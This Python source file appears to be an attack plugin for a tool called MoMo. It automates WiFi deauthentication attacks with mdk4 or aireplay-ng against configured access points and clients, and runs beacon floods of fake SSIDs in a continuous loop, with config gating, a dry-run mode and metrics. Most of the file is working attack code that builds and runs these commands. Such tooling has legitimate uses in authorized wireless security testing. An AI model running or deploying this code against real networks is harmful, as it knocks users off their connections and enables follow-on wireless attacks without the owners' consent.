"""
Active WiFi Attack Plugin - Async Implementation.

Provides deauthentication and beacon flood capabilities using mdk4 or aireplay-ng.
All operations are async-first per MoMo architecture requirements.
"""

from __future__ import annotations

import asyncio
import os
import platform
import shutil
import tempfile
from pathlib import Path
from typing import TYPE_CHECKING, Any

if TYPE_CHECKING:
    from asyncio.subprocess import Process

priority = 120

_RUN = False
_TASK: asyncio.Task[None] | None = None
_PROC: Process | None = None
_METRICS = {
    "momo_attack_deauth_runs_total": 0,
    "momo_attack_deauth_failures_total": 0,
    "momo_attack_beacon_runs_total": 0,
    "momo_attack_beacon_failures_total": 0,
    "momo_attack_last_rc": 0,
    "momo_attack_active": 0,
}


def _is_linux() -> bool:
    """Check if running on Linux."""
    return os.name != "nt" and platform.system() == "Linux"


def _cmd_exists(bin_name: str) -> bool:
    """Check if a command exists in PATH."""
    return bool(shutil.which(bin_name))


async def _run_command(cmd: list[str], max_secs: int) -> int:
    """
    Run a command asynchronously with timeout.

    Returns:
        Exit code (0 = success)
    """
    global _PROC

    try:
        _METRICS["momo_attack_active"] = 1

        _PROC = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )

        try:
            await asyncio.wait_for(_PROC.wait(), timeout=max_secs)
        except TimeoutError:
            # Process didn't finish in time, terminate it
            await _terminate_process(_PROC)

        rc = _PROC.returncode if _PROC.returncode is not None else 0
        _METRICS["momo_attack_last_rc"] = rc
        return rc

    except Exception:
        return -1

    finally:
        _PROC = None
        _METRICS["momo_attack_active"] = 0


async def _terminate_process(proc: Process) -> None:
    """Safely terminate a subprocess."""
    if proc.returncode is not None:
        return

    try:
        proc.terminate()
        try:
            await asyncio.wait_for(proc.wait(), timeout=3.0)
        except TimeoutError:
            proc.kill()
            await proc.wait()
    except Exception:
        pass


def _build_deauth_cmd(
    tool: str,
    iface: str,
    bssid: str,
    client: str | None,
    pps: int,
) -> list[str]:
    """Build deauthentication command for mdk4 or aireplay-ng."""
    if tool == "mdk4":
        # mdk4 <iface> d -t <BSSID> [-c <client>] -s <pps>
        cmd = ["mdk4", iface, "d", "-t", bssid, "-s", str(max(1, pps))]
        if client:
            cmd += ["-c", client]
        return cmd

    # aireplay-ng fallback: aireplay-ng --deauth 10 -a <BSSID> [-c <client>] <iface>
    cmd = ["aireplay-ng", "--deauth", "10", "-a", bssid]
    if client:
        cmd += ["-c", client]
    cmd.append(iface)
    return cmd


def _build_beacon_cmd(
    iface: str,
    ssids: list[str],
    pps: int,
) -> tuple[list[str], Path | None]:
    """Build beacon flood command for mdk4."""
    if not ssids:
        return [], None

    tmp = Path(tempfile.mkstemp(prefix="momo_beacon_", suffix=".txt")[1])
    tmp.write_text("\n".join(ssids), encoding="utf-8")

    # mdk4 <iface> b -s <file> -m <pps>
    return ["mdk4", iface, "b", "-s", str(tmp), "-m", str(max(1, pps))], tmp


def init(cfg: dict[str, Any]) -> None:
    """
    Initialize the active WiFi attack plugin.

    Starts the async attack loop in the background.
    """
    global _RUN, _TASK
    _RUN = True

    async def start_worker() -> None:
        try:
            await _run_attack_loop(cfg)
        except asyncio.CancelledError:
            pass
        except Exception:
            pass

    # Get or create event loop and schedule the task
    try:
        loop = asyncio.get_running_loop()
        _TASK = loop.create_task(start_worker())
    except RuntimeError:
        # No running loop - this shouldn't happen in async-first architecture
        pass


async def _run_attack_loop(cfg: dict[str, Any]) -> None:
    """Main attack loop - runs deauth and beacon attacks."""
    global _RUN

    # Resolve global config if provided by registry
    g = cfg.get("_global")
    aggressive_enabled = (
        bool(getattr(getattr(g, "aggressive", None), "enabled", False)) if g else False
    )

    iface = (
        cfg.get("iface")
        or (getattr(getattr(g, "interface", None), "name", None) if g else None)
        or "wlan0"
    )

    bssids: list[str] = cfg.get("bssid_whitelist") or []
    clients: list[str] = cfg.get("deauth_clients") or []
    ssids: list[str] = cfg.get("beacon_ssids") or []
    pps = int(cfg.get("pkts_per_second", 50))
    max_secs = int(cfg.get("max_runtime_secs", 20))
    cooldown = int(cfg.get("cooldown_secs", 0))  # 0 = no cooldown by default
    tool = str(cfg.get("tool", "auto"))
    dry = os.environ.get("MOMO_DRY_RUN") == "1" or os.name == "nt"

    # Early exit conditions
    if not _is_linux():
        return
    if not aggressive_enabled:
        return
    if not cfg.get("enabled", False):
        return

    # Choose attack tool
    chosen: str | None = None
    if tool in ("mdk4", "auto") and _cmd_exists("mdk4"):
        chosen = "mdk4"
    elif tool in ("aireplay-ng", "auto") and _cmd_exists("aireplay-ng"):
        chosen = "aireplay-ng"

    if chosen is None:
        return

    while _RUN:
        # Deauth attacks by BSSID list
        if bssids:
            for bssid in bssids:
                if not _RUN:
                    break

                if dry:
                    _METRICS["momo_attack_deauth_runs_total"] += 1
                    await asyncio.sleep(0.1)  # Yield control
                    continue

                cmd = _build_deauth_cmd(
                    chosen,
                    iface,
                    bssid,
                    clients[0] if clients else None,
                    pps,
                )
                rc = await _run_command(cmd, max_secs)

                if rc == 0:
                    _METRICS["momo_attack_deauth_runs_total"] += 1
                else:
                    _METRICS["momo_attack_deauth_failures_total"] += 1

                if cooldown > 0:
                    await asyncio.sleep(cooldown)

        # Beacon flood if SSIDs provided and mdk4 exists
        if ssids and _cmd_exists("mdk4"):
            if dry:
                _METRICS["momo_attack_beacon_runs_total"] += 1
                await asyncio.sleep(0.1)
            else:
                cmd, tmp = _build_beacon_cmd(iface, ssids, pps)
                try:
                    if cmd:
                        rc = await _run_command(cmd, max_secs)
                        if rc == 0:
                            _METRICS["momo_attack_beacon_runs_total"] += 1
                        else:
                            _METRICS["momo_attack_beacon_failures_total"] += 1
                finally:
                    if tmp:
                        try:
                            tmp.unlink(missing_ok=True)
                        except Exception:
                            pass

            if cooldown > 0:
                await asyncio.sleep(cooldown)

        # Break loop if neither configured
        if not bssids and not ssids:
            break

        # Small yield to prevent CPU spinning
        await asyncio.sleep(0.01)


async def shutdown_async() -> None:
    """Async shutdown - cancel task and terminate process."""
    global _RUN, _TASK, _PROC
    _RUN = False

    # Cancel the task
    if _TASK and not _TASK.done():
        _TASK.cancel()
        try:
            await _TASK
        except asyncio.CancelledError:
            pass
        _TASK = None

    # Terminate any running process
    if _PROC:
        await _terminate_process(_PROC)


_SHUTDOWN_TASK: asyncio.Task[None] | None = None


def shutdown() -> None:
    """Synchronous shutdown wrapper for plugin interface compatibility."""
    global _RUN, _PROC, _SHUTDOWN_TASK
    _RUN = False

    # Try to get running loop for async shutdown
    try:
        loop = asyncio.get_running_loop()
        _SHUTDOWN_TASK = loop.create_task(shutdown_async())
    except RuntimeError:
        # No running loop - do sync cleanup
        if _PROC and _PROC.returncode is None:
            try:
                _PROC.terminate()
            except Exception:
                pass


def get_metrics() -> dict[str, int]:
    """Return Prometheus-compatible metrics."""
    return dict(_METRICS)
